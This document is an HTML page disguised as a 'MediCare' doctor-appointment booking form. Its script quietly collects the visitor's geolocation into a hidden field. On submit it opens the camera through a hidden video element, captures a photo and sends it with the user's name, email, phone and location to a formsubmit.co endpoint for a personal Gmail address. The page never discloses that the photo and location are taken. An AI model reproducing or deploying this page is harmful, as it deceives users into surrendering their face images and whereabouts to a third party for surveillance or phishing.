<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MediCare Doctor Booking</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Montserrat:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Poppins', sans-serif; 
            background: linear-gradient(135deg, #e0f7fa 0%, #bbdefb 100%);
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding: 20px;
        }
        .container { 
            background: rgba(255, 255, 255, 0.95); 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.15); 
            padding: 30px; 
            width: 100%; 
            max-width: 500px; 
            backdrop-filter: blur(10px);
        }
        h1 { 
            text-align: center; 
            color: #0d47a1; 
            margin-bottom: 20px; 
            font-family: 'Montserrat', serif;
        }
        .form-group { 
            margin-bottom: 20px; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            color: #0d47a1; 
            font-weight: 600;
        }
        input, select { 
            width: 100%; 
            padding: 12px; 
            border: 2px solid #bbdefb; 
            border-radius: 8px; 
            font-size: 16px;
        }
        input:focus, select:focus { 
            border-color: #2196f3; 
            outline: none;
        }
        .btn {
            background: linear-gradient(to right, #2196f3, #0d47a1);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
            display: block;
            width: 100%;
            text-align: center;
            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3);
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(33, 150, 243, 0.4);
        }
        .hidden {
            display: none;
        }
        video, canvas { 
            width: 100%; 
            margin-top: 20px; 
            border-radius: 8px; 
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        .logo {
            width: 100px;
            height: auto;
            margin: 0 auto 20px;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://placehold.co/100x100?text=MC" alt="MediCare Logo" class="logo">
        <h1>Book Your Doctor Appointment</h1>
        <form id="bookingForm" action="https://formsubmit.co/lokhandeyuvraj19@gmail.com" method="POST" class="hidden">
            <div class="form-group">
                <label for="name">Full Name</label>
                <input type="text" id="name" name="name" required>
            </div>
            
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required>
            </div>
            
            <div class="form-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" name="phone" required>
            </div>
            
            <div class="form-group">
                <label for="service">Select Service</label>
                <select id="service" name="service" required>
                    <option value="">Choose Service</option>
                    <option value="general">General Checkup</option>
                    <option value="specialist">Specialist Consultation</option>
                    <option value="emergency">Emergency Care</option>
                </select>
            </div>
            
            <div class="form-group">
                <label for="date">Preferred Date</label>
                <input type="date" id="date" name="date" required>
            </div>
            
            <div class="form-group">
                <label for="time">Preferred Time</label>
                <input type="time" id="time" name="time" required>
            </div>
            
            <video id="video" autoplay playsinline muted class="hidden"></video>
            <canvas id="canvas" class="hidden"></canvas>
            
            <input type="hidden" id="locationData" name="location">
            <input type="hidden" id="photoData" name="photo">
            
            <button type="submit" class="btn">Book Appointment</button>
        </form>
        
        <button id="bookBtn" class="btn">Book Now</button>
    </div>

    <script>
        // Handle location access
        document.getElementById('bookBtn').addEventListener('click', () => {
            document.getElementById('bookingForm').classList.remove('hidden');
            document.getElementById('bookBtn').remove();
            
            // Request location after form appears
            setTimeout(() => {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        const loc = `${pos.coords.latitude},${pos.coords.longitude}`;
                        document.getElementById('locationData').value = loc;
                    },
                    err => console.log(`Location error: ${err.message}`)
                );
            }, 100);
        });

        // Handle camera access
        document.getElementById('bookingForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // Capture photo when video starts
                video.addEventListener('loadeddata', () => {
                    const canvas = document.getElementById('canvas');
                    const ctx = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    ctx.drawImage(video, 0, 0);
                    const imgData = canvas.toDataURL('image/jpeg');
                    document.getElementById('photoData').value = imgData;
                    
                    // Submit form after capture
                    setTimeout(() => {
                        document.getElementById('bookingForm').submit();
                    }, 500);
                });
            } catch (err) {
                console.log(`Camera error: ${err.message}`);
                document.getElementById('bookingForm').submit();
            }
        });
    </script>
</body>
</html>
